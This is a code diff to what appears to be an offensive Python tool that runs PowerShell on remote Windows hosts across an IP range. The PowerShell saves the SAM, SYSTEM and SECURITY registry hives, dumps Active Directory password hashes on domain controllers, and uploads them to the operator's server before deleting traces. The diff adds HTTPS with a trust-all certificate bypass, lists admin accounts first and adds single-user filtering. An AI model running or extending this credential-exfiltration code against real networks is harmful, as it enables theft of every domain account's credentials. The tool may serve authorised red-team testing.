@@ -8,6 +8,7 @@ import string
 import zipfile
 import shutil
 import sys
+import ssl
 from http.server import SimpleHTTPRequestHandler, HTTPServer
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
@@ -15,6 +16,9 @@ DSINTERNALS_URL = "https://github.com/MichaelGrafnetter/DSInternals/releases/dow
 DSINTERNALS_ZIP = "DSInternals_v6.2.zip"
 EXEC_SCRIPT = "exec_across_windows.py"
 UPLOAD_DIR = "./secretsdump_ng_out/"
+DSINTERNALS_SERVE_DIR = os.path.join(UPLOAD_DIR, "dsinternals_files")
+CERT_FILE = os.path.join(UPLOAD_DIR, "cert.pem")
+KEY_FILE = os.path.join(UPLOAD_DIR, "key.pem")
 
 
 def parse_ip_range(ip_range):
@@ -55,6 +59,30 @@ def get_host_ip_given_target(target_ip):
         return None
 
 
+def generate_ssl_cert():
+    """Generate SSL certificate"""
+    if os.path.exists(CERT_FILE):
+        os.remove(CERT_FILE)
+    if os.path.exists(KEY_FILE):
+        os.remove(KEY_FILE)
+    
+    print("[*] Generating SSL certificate...")
+    cmd = [
+        "openssl", "req", "-x509", "-newkey", "rsa:2048",
+        "-keyout", KEY_FILE,
+        "-out", CERT_FILE,
+        "-days", "1", "-nodes",
+        "-subj", "/CN=localhost"
+    ]
+    
+    try:
+        subprocess.check_call(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        print("[*] SSL certificate generated")
+    except subprocess.CalledProcessError:
+        print("[!] Failed to generate SSL certificate for secure file transfers")
+        sys.exit(1)
+
+
 def parse_ds_file(filepath):
     """Parse DSInternals dump file and extract credentials"""
     try:
@@ -89,16 +117,22 @@ def parse_ds_file(filepath):
             sid = line.split(':', 1)[1].strip()
             current_entry['rid'] = sid.split('-')[-1]
         
+        elif line.startswith('AdminCount:'):
+            admin_value = line.split(':', 1)[1].strip()
+            current_entry['is_admin'] = (admin_value.lower() == 'true')
+        
         elif line.startswith('NTHash:'):
             nt_hash = line.split(':', 1)[1].strip()
             if nt_hash:
                 current_entry['nt'] = nt_hash
-        
+                # Default empty LM hash value; same behavior as original secretsdump
+                current_entry['lm'] = "aad3b435b51404eeaad3b435b51404ee"        
+
         elif line.startswith('LMHash:'):
             lm_hash = line.split(':', 1)[1].strip()
             if lm_hash:
                 current_entry['lm'] = lm_hash
-        
+
         elif line.startswith('ClearText:'):
             cleartext = line.split(':', 1)[1].strip()
             if cleartext and all(ord(c) < 128 and c in string.printable for c in cleartext):
@@ -131,13 +165,22 @@ def parse_ds_file(filepath):
 
 def format_ntds_output(entries):
     """Format NTDS entries in secretsdump style"""
+    # Sort entries: admins first (alphabetically), then non-admins (alphabetically)
+    admin_entries = sorted([e for e in entries if e.get('is_admin', False)], 
+                          key=lambda x: x.get('sam', '').lower())
+    non_admin_entries = sorted([e for e in entries if not e.get('is_admin', False)], 
+                               key=lambda x: x.get('sam', '').lower())
+    sorted_entries = admin_entries + non_admin_entries
+    
     lines = []
     cleartext_lines = []
     kerberos_lines = []
     
-    for entry in entries:
+    for entry in sorted_entries:
         sam = entry.get('sam', '')
         rid = entry.get('rid', '')
+        is_admin = entry.get('is_admin', False)
+        admin_tag = '\033[38;5;208m(admin)\033[0m ' if is_admin else ''
         
         if not sam or not rid:
             continue
@@ -149,10 +192,10 @@ def format_ntds_output(entries):
             lm_display = lm if lm else ''
             nt_display = nt if nt else ''
             if lm_display or nt_display:
-                lines.append(f"{sam}:{rid}:{lm_display}:{nt_display}:::")
+                lines.append(f"{admin_tag}{sam}:{rid}:{lm_display}:{nt_display}:::")
         
         if 'cleartext' in entry:
-            cleartext_lines.append(f"{sam}:CLEARTEXT:{entry['cleartext']}")
+            cleartext_lines.append(f"{admin_tag}{sam}:CLEARTEXT:{entry['cleartext']}")
         
         if 'kerberos' in entry and entry['kerberos']:
             kerb = entry['kerberos']
@@ -164,7 +207,7 @@ def format_ntds_output(entries):
             if 'des' in kerb:
                 kerb_parts.append(f"des-cbc-md5:{kerb['des']}")
             if len(kerb_parts) > 1:
-                kerberos_lines.append(':'.join(kerb_parts))
+                kerberos_lines.append(admin_tag + ':'.join(kerb_parts))
     
     output = []
     if lines:
@@ -184,7 +227,41 @@ def format_ntds_output(entries):
     return '\n'.join(output) if output else ''
 
 
-def process_registry_hives(zip_path, ip):
+def filter_secretsdump_output(output, just_dc_user):
+    """Filter secretsdump output to only include specified user"""
+    if not just_dc_user:
+        return output
+    
+    lines = output.split('\n')
+    filtered_lines = []
+    in_relevant_section = False
+    found_user = False
+    
+    for line in lines:
+        # Keep header lines
+        if line.startswith('[*]'):
+            filtered_lines.append(line)
+            in_relevant_section = True
+            continue
+        
+        # Empty lines reset section tracking
+        if not line.strip():
+            if found_user:
+                filtered_lines.append(line)
+            in_relevant_section = False
+            continue
+        
+        # Check if this line contains the target user
+        if in_relevant_section and ':' in line:
+            username = line.split(':')[0]
+            if username.lower() == just_dc_user.lower():
+                filtered_lines.append(line)
+                found_user = True
+    
+    return '\n'.join(filtered_lines) if found_user else ''
+
+
+def process_registry_hives(zip_path, ip, just_dc_user=None):
     """Extract registry hives and run impacket-secretsdump"""
     try:
         extract_dir = os.path.join(UPLOAD_DIR, ip)
@@ -219,7 +296,10 @@ def process_registry_hives(zip_path, ip):
         
         print(f"\033[32m[+]\033[0m Registry hives received from {ip}")
         
-        return result.stdout
+        # Filter output if just_dc_user is specified
+        output = filter_secretsdump_output(result.stdout, just_dc_user)
+        
+        return output
         
     except Exception as e:
         print(f"[!] Error processing registry hives for {ip}: {e}")
@@ -257,6 +337,8 @@ def finalize_output(ip):
     # Write final output
     if output_parts:
         final_content = '\n'.join(output_parts)
+        
+        # Write output (full dump always overwrites, single-user only if file doesn't exist)
         with open(final_output, 'w') as f:
             f.write(final_content)
         print(f"\033[32m[+]\033[0m Credentials saved to: {final_output}")
@@ -266,7 +348,10 @@ def finalize_output(ip):
 
 
 class FileUploadHTTPRequestHandler(SimpleHTTPRequestHandler):
-    """HTTP handler for receiving credential dumps"""
+    """HTTPS handler for receiving credential dumps"""
+    
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, directory=DSINTERNALS_SERVE_DIR, **kwargs)
     
     def do_POST(self):
         os.makedirs(UPLOAD_DIR, exist_ok=True)
@@ -287,7 +372,9 @@ class FileUploadHTTPRequestHandler(SimpleHTTPRequestHandler):
                 with open(zip_path, 'wb') as f:
                     f.write(data)
                 
-                hives_output = process_registry_hives(zip_path, ip)
+                # Get just_dc_user from server if available
+                just_dc_user = getattr(self.server, 'just_dc_user', None)
+                hives_output = process_registry_hives(zip_path, ip, just_dc_user)
                 output_file = os.path.join(extract_dir, 'secretsdump_output.txt')
                 with open(output_file, 'w') as f:
                     f.write(hives_output)
@@ -317,18 +404,24 @@ class FileUploadHTTPRequestHandler(SimpleHTTPRequestHandler):
             pass
 
 
-def start_upload_server():
-    """Start HTTP server for receiving credential uploads on port 1338"""
-    class CustomHandler(FileUploadHTTPRequestHandler):
-        def __init__(self, *args, **kwargs):
-            super().__init__(*args, directory=UPLOAD_DIR, **kwargs)
+def start_upload_server(just_dc_user=None):
+    """Start HTTPS server for receiving credential uploads on port 1338"""
+    http_server = HTTPServer(("0.0.0.0", 1338), FileUploadHTTPRequestHandler)
     
-    global http_server
-    http_server = HTTPServer(("0.0.0.0", 1338), CustomHandler)
-    http_server.serve_forever()
+    # Store just_dc_user in server for handler access
+    http_server.just_dc_user = just_dc_user
+    
+    # Wrap with SSL
+    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+    context.load_cert_chain(CERT_FILE, KEY_FILE)
+    http_server.socket = context.wrap_socket(http_server.socket, server_side=True)
+    
+    global https_server
+    https_server = http_server
+    https_server.serve_forever()
 
 
-http_server = None
+https_server = None
 
 
 print_lock = threading.Lock()
@@ -342,6 +435,20 @@ def generate_command(ip, username, password, just_dc_user, verbose, show_output,
     host_ip = get_host_ip_given_target(ip)
 
     ps_script = f'''
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+Add-Type @"
+using System.Net;
+using System.Security.Cryptography.X509Certificates;
+public class TrustAllCertsPolicy : ICertificatePolicy {{
+    public bool CheckValidationResult(
+        ServicePoint srvPoint, X509Certificate certificate,
+        WebRequest request, int certificateProblem) {{
+        return true;
+    }}
+}}
+"@
+[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
+
 $isDC = $false
 try {{
     $ntds = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS" -ErrorAction SilentlyContinue).ObjectName
@@ -354,7 +461,7 @@ reg save HKLM\\SECURITY C:\\ProgramData\\SECURITY /y | Out-Null
 
 Compress-Archive -Path C:\\ProgramData\\SAM,C:\\ProgramData\\SYSTEM,C:\\ProgramData\\SECURITY -DestinationPath C:\\ProgramData\\hives_{ip}.zip -Force
 
-iwr -Uri "http://{host_ip}:1338/upload" -Method Post -InFile "C:\\ProgramData\\hives_{ip}.zip" -Headers @{{"filename"="hives_{ip}.zip"}} -UseBasicParsing | Out-Null
+iwr -Uri "https://{host_ip}:1338/upload" -Method Post -InFile "C:\\ProgramData\\hives_{ip}.zip" -Headers @{{"filename"="hives_{ip}.zip"}} -UseBasicParsing | Out-Null
 
 del C:\\ProgramData\\SAM
 del C:\\ProgramData\\SYSTEM
@@ -362,7 +469,7 @@ del C:\\ProgramData\\SECURITY
 del C:\\ProgramData\\hives_{ip}.zip
 
 if ($isDC) {{
-    iwr http://{host_ip}:1338/{DSINTERNALS_ZIP} -o C:\\ProgramData\\DSInternals.zip
+    iwr https://{host_ip}:1338/{DSINTERNALS_ZIP} -o C:\\ProgramData\\DSInternals.zip
     Expand-Archive C:\\ProgramData\\DSInternals.zip -d C:\\ProgramData\\DSInternals\\
     Import-Module C:\\ProgramData\\DSInternals\\DSInternals\\DSInternals.psd1
 '''
@@ -372,7 +479,7 @@ if ($isDC) {{
     else:
         ps_script += f'    Get-ADReplAccount -All -Server LOCALHOST | Out-File C:\\ProgramData\\ntds_{ip}.out -Encoding Unicode\n'
 
-    ps_script += f'''    iwr -Uri "http://{host_ip}:1338/upload" -Method Post -InFile "C:\\ProgramData\\ntds_{ip}.out" -Headers @{{"filename"="ntds_{ip}.out"}} -UseBasicParsing | Out-Null
+    ps_script += f'''    iwr -Uri "https://{host_ip}:1338/upload" -Method Post -InFile "C:\\ProgramData\\ntds_{ip}.out" -Headers @{{"filename"="ntds_{ip}.out"}} -UseBasicParsing | Out-Null
     del C:\\ProgramData\\ntds_{ip}.out
     del C:\\ProgramData\\DSInternals.zip
     Remove-Item -Recurse -Force C:\\ProgramData\\DSInternals\\
@@ -417,7 +524,15 @@ if ($isDC) {{
 
 
 def main(args):
-    dsinternals_path = os.path.join(UPLOAD_DIR, DSINTERNALS_ZIP)
+    # Create directories
+    os.makedirs(UPLOAD_DIR, exist_ok=True)
+    os.makedirs(DSINTERNALS_SERVE_DIR, exist_ok=True)
+    
+    # Generate SSL certificate
+    generate_ssl_cert()
+    
+    # Download and prepare DSInternals
+    dsinternals_path = os.path.join(DSINTERNALS_SERVE_DIR, DSINTERNALS_ZIP)
     
     if not os.path.exists(dsinternals_path):
         print("[*] Downloading DSInternals...")
@@ -431,8 +546,8 @@ def main(args):
         print(f"[!] {EXEC_SCRIPT} not found")
         return
 
-    print("[*] Starting HTTP server on port 1338")
-    threading.Thread(target=start_upload_server, daemon=True).start()
+    print("[*] Starting HTTPS server on port 1338")
+    threading.Thread(target=start_upload_server, args=(args.just_dc_user,), daemon=True).start()
 
     targets = parse_ip_range(args.ip_range)
     show_single_output = len(targets) == 1
@@ -462,9 +577,9 @@ def main(args):
 
     print("\n[*] All tasks completed")
     
-    if http_server:
-        print("[*] Shutting down HTTP server...")
-        http_server.shutdown()
+    if https_server:
+        print("[*] Shutting down HTTPS server...")
+        https_server.shutdown()
     
     print("[*] Done!")
 
